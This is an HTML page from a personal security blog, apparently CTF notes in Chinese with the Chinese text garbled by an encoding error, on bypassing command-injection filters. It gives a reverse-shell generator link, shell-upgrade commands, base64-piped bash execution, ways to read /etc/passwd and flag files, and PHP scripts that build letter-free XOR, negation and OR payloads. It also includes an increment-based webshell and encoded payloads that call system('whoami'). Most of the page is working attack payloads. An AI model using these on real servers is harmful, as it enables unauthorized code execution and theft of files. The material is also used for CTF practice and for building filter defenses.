<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>å‘½ä»¤æ³¨å…¥ - ConsT27's Blog</title>
    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u547d\u4ee4\u6ce8\u5165", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_2" },
              {title: "Tool", url: "#tool" },
              {title: "shell \u5347\u7ea7", url: "#shell" },
              {title: "Bypass", url: "#bypass" },
              {title: "PHP Bypass", url: "#php-bypass" },
          ]},
        ];

    </script>
    <script src="../../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../../%E7%A4%BE%E5%B7%A5%F0%9F%91%96/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../../%E7%A4%BE%E5%B7%A5%F0%9F%91%96/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/" class="btn btn-xs btn-link">
        ç¤¾å·¥ğŸ‘–
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" class="btn btn-xs btn-link">
        jså‰ç«¯åŠ å¯†
      </a>
    </div>
    
  </div>

    

    <h1 id="_1">å‘½ä»¤æ³¨å…¥</h1>
<h2 id="_2">ç›®å½•</h2>
<ul>
<li><a href="#Tool">Tool</a></li>
<li><a href="#shell-å‡çº§">shell å‡çº§</a></li>
<li><a href="#Bypass">Bypass</a><ul>
<li><a href="#é€šç”¨å‹">é€šç”¨å‹</a></li>
<li><a href="#ç©ºæ ¼">ç©ºæ ¼</a></li>
<li><a href="#">&amp;,|</a></li>
<li><a href="#æ–œæ ">æ–œæ </a></li>
<li><a href="#å…³é”®å­—">å…³é”®å­—</a></li>
</ul>
</li>
<li><a href="#PHP-Bypass">PHP Bypass</a><ul>
<li><a href="#æ— å­—æ¯æ•°å­—RCERCEME">æ— å­—æ¯æ•°å­—RCEï¼ˆRCEMEï¼‰</a><ul>
<li><a href="#å¼‚æˆ–">å¼‚æˆ–</a></li>
<li><a href="#å–å">å–å</a></li>
<li><a href="#è‡ªå¢">è‡ªå¢</a></li>
<li><a href="#æˆ–è¿ç®—">æˆ–è¿ç®—</a></li>
<li><a href="#éªšpayload">éªšpayload</a></li>
</ul>
</li>
<li><a href="#ä¸‹åˆ’çº¿">ä¸‹åˆ’çº¿</a></li>
<li><a href="#åˆ†å·">åˆ†å·</a></li>
<li><a href="#ç¬¦">\$ç¬¦</a></li>
<li><a href="#php5å’Œ7çš„åŒºåˆ«">php5å’Œ7çš„åŒºåˆ«</a></li>
</ul>
</li>
</ul>
<h2 id="tool">Tool</h2>
<p>åå¼¹shellç”Ÿæˆ</p>
<p><a href="https://www.ddosi.org/shell/" title="https://www.ddosi.org/shell/">https://www.ddosi.org/shell/</a></p>
<h2 id="shell">shell å‡çº§</h2>
<pre><code class="language-çº¯æ–‡æœ¬">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' 
python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' 

</code></pre>
<p>å®Œå…¨äº¤äº’å¼</p>
<pre><code class="language-çº¯æ–‡æœ¬">$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
Ctrl-Z
$ stty raw -echo
$ fg
$ reset
$ export SHELL=bash
//$ export TERM=xterm-256color
</code></pre>
<h2 id="bypass">Bypass</h2>
<h3 id="_3">é€šç”¨å‹</h3>
<p>ç©ºæ ¼ï¼Œæ•æ„Ÿå­—ç¬¦ bypass
éœ€è¦echoï¼Œï½œï¼Œbashï¼Œbase64å­˜åœ¨</p>
<pre><code class="language-çº¯æ–‡æœ¬">echo${IFS}&quot;[ PAYLOAD ]&quot;|base64${IFS}-d|bash

</code></pre>
<pre><code class="language-çº¯æ–‡æœ¬">${printf &quot;\xaa&quot;} åå…­è¿›åˆ¶ç»•è¿‡
${printf &quot;\144\121&quot;} å…«è¿›åˆ¶ç»•è¿‡

è¯»æ–‡ä»¶catä¹‹ç±»çš„è¢«banäº†
curl file:///flag
strings /flag
uniq -c/etc/passwd
bash -v /etc/passwd
rev /etc/passwd
</code></pre>
<h3 id="_4">ç©ºæ ¼</h3>
<pre><code class="language-çº¯æ–‡æœ¬">$&lt;ç¬¦å·
$IFS
${IFS}
$IFS$9
%09 ç”¨äºurlä¼ é€’ %0a %0dä¹Ÿå¯ä»¥
cat&lt;/flag
{cat,flag}
&lt;&gt;ï¼ˆcat&lt;&gt;/flagï¼‰
&lt;ï¼ˆcat&lt;/flagï¼‰

</code></pre>
<h3 id="_5">&amp;,|</h3>
<h3 id="_6">æ–œæ </h3>
<pre><code class="language-çº¯æ–‡æœ¬">é€šè¿‡ç¯å¢ƒå˜é‡æ‹¿/
å‡è®¾æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå˜é‡ä¸ºï¼š
file=/dir1/dir2/dir3/my.file.txt
æˆ‘ä»¬å¯ä»¥ç”¨ ${ } åˆ†åˆ«æ›¿æ¢è·å¾—ä¸åŒçš„å€¼ï¼š
${file#*/}ï¼šæ‹¿æ‰ç¬¬ä¸€æ¡ / åŠå…¶å·¦è¾¹çš„å­—ä¸²ï¼šdir1/dir2/dir3/my.file.txt
${file##*/}ï¼šæ‹¿æ‰æœ€åä¸€æ¡ / åŠå…¶å·¦è¾¹çš„å­—ä¸²ï¼šmy.file.txt
${file#*.}ï¼šæ‹¿æ‰ç¬¬ä¸€ä¸ª . åŠå…¶å·¦è¾¹çš„å­—ä¸²ï¼šfile.txt
${file##*.}ï¼šæ‹¿æ‰æœ€åä¸€ä¸ª . åŠå…¶å·¦è¾¹çš„å­—ä¸²ï¼štxt
${file%/*}ï¼šæ‹¿æ‰æœ€åæ¡ / åŠå…¶å³è¾¹çš„å­—ä¸²ï¼š/dir1/dir2/dir3
${file%%/*}ï¼šæ‹¿æ‰ç¬¬ä¸€æ¡ / åŠå…¶å³è¾¹çš„å­—ä¸²ï¼š(ç©ºå€¼)
${file%.*}ï¼šæ‹¿æ‰æœ€åä¸€ä¸ª . åŠå…¶å³è¾¹çš„å­—ä¸²ï¼š/dir1/dir2/dir3/my.file
${file%%.*}ï¼šæ‹¿æ‰ç¬¬ä¸€ä¸ª . åŠå…¶å³è¾¹çš„å­—ä¸²ï¼š/dir1/dir2/dir3/my

ä½¿ç”¨ï¼›æ‰§è¡Œå¤šæ¡å‘½ä»¤
cd flag_dir;cat flag
</code></pre>
<h3 id="_7">å…³é”®å­—</h3>
<pre><code class="language-çº¯æ–‡æœ¬">flag  -&gt; fla''g  fla&quot;&quot;g  fla\g  

æ‹¼æ¥ç»•è¿‡
a=fl;b=ag;cat $a$b

</code></pre>
<h2 id="php-bypass">PHP Bypass</h2>
<h3 id="rcerceme">æ— å­—æ¯æ•°å­—RCEï¼ˆRCEMEï¼‰</h3>
<h4 id="_8">å¼‚æˆ–</h4>
<p>è¿™é‡Œçš„å¼‚æˆ–ï¼ŒæŒ‡çš„æ˜¯phpæŒ‰ä½å¼‚æˆ–ï¼Œåœ¨phpä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–æ“ä½œåï¼Œå¾—åˆ°çš„ä¾ç„¶æ˜¯<strong>ä¸€ä¸ªå­—ç¬¦</strong>ï¼Œæ‰€ä»¥è¯´å½“æˆ‘ä»¬æƒ³å¾—åˆ°<code>a-z</code>ä¸­æŸä¸ªå­—æ¯æ—¶ï¼Œå°±å¯ä»¥æ‰¾åˆ°ä¸¤ä¸ªéå­—æ¯æ•°å­—çš„å­—ç¬¦ï¼Œåªè¦ä»–ä»¬ä¿©çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚è€Œåœ¨phpä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²è½¬æ¢æˆ<code>asciiç </code>å€¼ï¼Œå†å°†è¿™ä¸ªå€¼è½¬æ¢æˆäºŒè¿›åˆ¶ï¼Œç„¶åä¸€ä½ä¸€ä½çš„è¿›è¡ŒæŒ‰ä½å¼‚æˆ–ï¼Œå¼‚æˆ–çš„è§„åˆ™æ˜¯ï¼š<code>1^1=0,1^0=1,0^1=1,0^0=0</code>ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯<strong>ç›¸åŒä¸ºé›¶ï¼Œä¸åŒä¸ºä¸€</strong>ã€‚</p>
<p>æ„é€ è„šæœ¬</p>
<p>ç”Ÿæˆå­—æ¯è¡¨çš„phpæ–‡ä»¶</p>
<pre><code class="language-çº¯æ–‡æœ¬">&lt;?php

$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);
$contents=&quot;&quot;;
for ($i=0; $i &lt; 256; $i++) { 
for ($j=0; $j &lt;256 ; $j++) { 
â€‹
if($i&lt;16){
$hex_i='0'.dechex($i);
}
else{
$hex_i=dechex($i);
}
if($j&lt;16){
$hex_j='0'.dechex($j);
}
else{
$hex_j=dechex($j);
}
$preg = '/[a-z0-9]/i';    // æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯
if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
echo &quot;&quot;;
}
â€‹
else{
$a='%'.$hex_i;
$b='%'.$hex_j;
$c=(urldecode($a)^urldecode($b));
if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {
$contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
}
}
â€‹
}
}
fwrite($myfile,$contents);
fclose($myfile);
</code></pre>
<p>æ ¹æ®å­—æ¯è¡¨æ¥ç”Ÿæˆpayloadçš„python</p>
<pre><code class="language-çº¯æ–‡æœ¬"># -*- coding: utf-8 -*-

def action(arg):
s1=&quot;&quot;
s2=&quot;&quot;
for i in arg:
f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)
while True:
t=f.readline()
if t==&quot;&quot;:
break
if t[0]==i:
#print(i)
s1+=t[2:5]
s2+=t[6:9]
break
f.close()
output=&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;
return(output)

while True:
param=action(input(&quot;\n[+] your functionï¼š&quot;) )+action(input(&quot;[+] your commandï¼š&quot;))+&quot;;&quot;
print(param)
</code></pre>
<p><img alt="" src="../image/image_uMKc8WQRVC.png" /></p>
<p><img alt="" src="../image/image_1oq_Z6ve2b.png" /></p>
<h4 id="_9">å–å</h4>
<pre><code class="language-çº¯æ–‡æœ¬">&lt;?php
//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ

fwrite(STDOUT,'[+]your function: ');

$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); 

fwrite(STDOUT,'[+]your command: ');

$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); 

echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
</code></pre>
<p><img alt="" src="../image/image_dgwKYKzMdl.png" /></p>
<h4 id="_10">è‡ªå¢</h4>
<p>webshellï¼Œè®°å¾—urlencode</p>
<pre><code class="language-çº¯æ–‡æœ¬">$_=[];$_=@&quot;$_&quot;;$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
</code></pre>
<p><img alt="" src="../image/image_x6nEV_MEaG.png" /></p>
<h4 id="_11">æˆ–è¿ç®—</h4>
<p>è„šæœ¬</p>
<pre><code class="language-çº¯æ–‡æœ¬">import re
from urllib.parse import unquote
import requests

preg = '[0-9a-z]'#(\^)(\+)(\~)(\$)(\[)(\])(\{)(\})(\&amp;)(\-)]'å¯ä»¥è‡ªå·±æ”¹æ­£åˆ™
filename = 'Or.txt'

with open(filename, &quot;w&quot;) as file_ob:
    pass

for i in range(256):
    if re.match(preg,chr(i),re.I):
        continue
    for j in range(256):
        if re.match(preg,chr(j),re.I):
            continue
        else:
            if(i &lt; 16):
                hexI = '%0' + hex(i)[2:]
            else:
                hexI = '%' + hex(i)[2:]
            if(j &lt; 16):
                hexJ = '%0' + hex(j)[2:]
            else:
                hexJ = '%' + hex(j)[2:]  
            if((i|j) &gt;= 32 and (i|j) &lt;= 126):
                #print(chr(i) + '|'+ chr(j) + &quot; = &quot; + chr(i|j) + '--------' , i ,'|' , j , '=' , (i|j))
                with open(filename, &quot;a&quot;) as file_ob:
                    file_ob.write(hexI + '|'+ hexJ + &quot;=&quot; + str(chr(i|j)) 
                    + '--------' + str(i) + '|' + str(j) + '=' + str((i|j)) + &quot;\n&quot;)

def rep(args):
    payload = ''
    payload1 = ''
    payload2 = ''
    with open(filename) as file_ob:
        lines = file_ob.readlines()
    for i in args:
        for line in lines:
            #print(line)
            if line[8] == i:
                #print('(\&quot;'+ line[:3] + '\&quot;|\&quot;' + line[4:7] + '\&quot;)', end = &quot;&quot;)
                payload1 += line[:3]  
                payload2 += line[4:7] 
                break
    #print(payload)
    payload = '\&quot;' + payload1 + '\&quot;|\&quot;'+ payload2 + '\&quot;' 
    return payload

running = True
while running:
    exp = rep(input(&quot;your payload:\n&quot;))
    print(&quot;URLç¼–ç &quot;,exp)
    print(&quot;æ— URLç¼–ç &quot;,unquote(exp))
    #url = 'http://' 
    #data = {'c': unquote(exp)}
    #headers = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
    #r = requests.post(url, data = data)
    print(&quot;-------------ç»“æœ--------------&quot;)
    #print(r.text)
    print(&quot;\n&quot;)
</code></pre>
<p>æ¯”å¦‚æƒ³æ‰§è¡Œsystem("ls /") å°±å¾—è¿™æ ·</p>
<p><img alt="" src="../image/image_kluiG0euBi.png" /></p>
<h4 id="payload">éªšpayload</h4>
<pre><code class="language-çº¯æ–‡æœ¬">${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff^%88%97%90%9E%92%96);&amp;%ff=system
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&amp;%ff=readfile
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&amp;%ff=highlight_file

// å³: 
// ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('whoami');&amp;%ff=system
// ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&amp;%ff=readfile
// ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&amp;%ff=highlight_file

${%ff%ff%ff%ff^%a0%b8%ba%ab} ä»£è¡¨${_GET}:
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo
å³: 
${_GET}{%ff}();&amp;%ff=phpinfo
//?shell=${_GET}{%ff}();&amp;%ff=phpinfo

</code></pre>
<p><img alt="" src="../image/image_kRK0W1TEW4.png" /></p>
<p>åŒç†ä¹Ÿå¯ä»¥å–å</p>
<pre><code class="language-çº¯æ–‡æœ¬">${~%A0%B8%BA%AB}{%ff}();&amp;%ff=phpinfo
${~%A0%B8%BA%AB}{%ff}(~%88%97%90%9E%92%96);&amp;%ff=system //system('whoami')
</code></pre>
<p>ä¹Ÿå¯ä»¥ç”¨åå¼•å·åŠ çŸ­æ ‡ç­¾</p>
<pre><code class="language-çº¯æ–‡æœ¬">?&gt;&lt;?=`{${~%A0%B8%BA%AB}{%ff}}`?&gt;&amp;%ff=ls /
å³: 
?&gt;&lt;?=`$_GET[%ff]`?&gt;&amp;%ff=ls /
æœ€å¼€å¤´çš„?&gt;é—­åˆäº† eval() å‡½æ•°è‡ªå¸¦çš„&lt;?æ ‡ç­¾ã€‚æ¥ä¸‹æ¥ä½¿ç”¨äº†çŸ­æ ‡ç­¾ä»£æ›¿&lt;?php echo ... ?&gt;ã€‚{}é‡Œé¢åŒ…å«çš„ PHP ä»£ç å¯ä»¥è¢«æ‰§è¡Œï¼Œ~%A0%B8%BA%ABä¸º_GETï¼Œæœ€åå°†é€šè¿‡å‚æ•°%ffä¼ å…¥çš„å€¼ä½¿ç”¨åå¼•å·è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚
</code></pre>
<h3 id="_12">ä¸‹åˆ’çº¿</h3>
<p>ç®€å•ï¼Œæˆ‘ä»¬ä¸Šé¢æœ‰å¾ˆå¤špayloadå‹æ ¹å°±æ²¡ç”¨åˆ°_</p>
<h3 id="_13">åˆ†å·</h3>
<p>æ— éœ€æ‹…å¿ƒï¼Œå‰é¢æˆ‘ä»¬å·²ç»è¯´äº†ï¼ŒPHP çŸ­æ ‡ç­¾ä¸­çš„ä»£ç ä¸éœ€è¦å†™åˆ†å·ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æŠŠæ‰€æœ‰çš„ PHP è¯­å¥æ”¹æˆçŸ­æ ‡ç­¾å½¢å¼å°±è¡Œäº†ã€‚</p>
<pre><code class="language-çº¯æ–‡æœ¬">&lt;?=echo (1)?&gt;
</code></pre>
<h3 id="_14">\$ç¬¦</h3>
<p>å¦‚æœphp7ä»¥ä¸Šï¼Œå¯ä»¥ç”¨æˆ–è¿ç®—æˆ–è€…å¼‚æˆ–æ¥ç»•è¿‡ï¼Œå› ä¸ºå…¶payloadé‡Œæ²¡\$ç¬¦ã€‚åŸå› æ˜¯php7ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨(\$a)()è¿™ç§æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤</p>
<p>åœ¨ PHP 5 ä¸­å¦‚æœæˆ‘ä»¬è¿˜ä½¿ç”¨<code>('phpinfo')();</code>è¿™æ ·çš„ PHP è¡¨è¾¾å¼åˆ™ä¼šå¾—åˆ°ä¸€ä¸ªæŠ¥é”™ï¼ŒåŸå› å°±æ˜¯ PHP 5 å¹¶ä¸æ”¯æŒè¿™ç§è¡¨è¾¾æ–¹å¼ã€‚æ‰€ä»¥ï¼Œå¦‚æœä¹Ÿè¿‡æ»¤äº†<code>$</code>çš„è¯ï¼Œå¯¹äº PHP 5 ç¯å¢ƒçš„åˆ©ç”¨æ–¹æ³•å°±å¾ˆå¤æ‚äº†ã€‚</p>
<h3 id="php57">php5å’Œ7çš„åŒºåˆ«</h3>
<p>åœ¨ç ”ç©¶æ— æ•°å­—å­—æ¯rceçš„è¿‡ç¨‹ä¸­ï¼Œä¸€ä¸ªå¾ˆé‡è¦çš„å‡½æ•°å°±æ˜¯<code>assert</code>ï¼Œä½†åœ¨php5çš„ç‰ˆæœ¬å’Œphp7çš„ç‰ˆæœ¬ä¸­ï¼Œå®ƒæ˜¯æœ‰ä¸€äº›åŒºåˆ«çš„ï¼Œæˆ‘ä»¬ä¸Šé¢çš„æµ‹è¯•éƒ½æ˜¯åŸºäºphp5è¿›è¡Œçš„ï¼Œåœ¨php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>$f='assert';$f(...);</code>è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ï¼Œåœ¨php7ä¸­ï¼Œassertä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼evalï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç </p>
<p>ä½†æ˜¯åœ¨php7ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨(\$a)()è¿™ç§æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ç›¸å½“äºæˆ‘ä»¬å¯¹phpinfoå–ååå°±å¯ä»¥ç›´æ¥æ‰§è¡Œäº†ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©file_put_contents()æ¥å†™å…¥shellï¼Œåœ¨php5ä¸­è¿™æ ·æ˜¯ä¸è¡Œçš„ï¼š</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../../%E7%A4%BE%E5%B7%A5%F0%9F%91%96/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../../%E7%A4%BE%E5%B7%A5%F0%9F%91%96/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/" class="btn btn-xs btn-link">
        ç¤¾å·¥ğŸ‘–
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" class="btn btn-xs btn-link">
        jså‰ç«¯åŠ å¯†
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>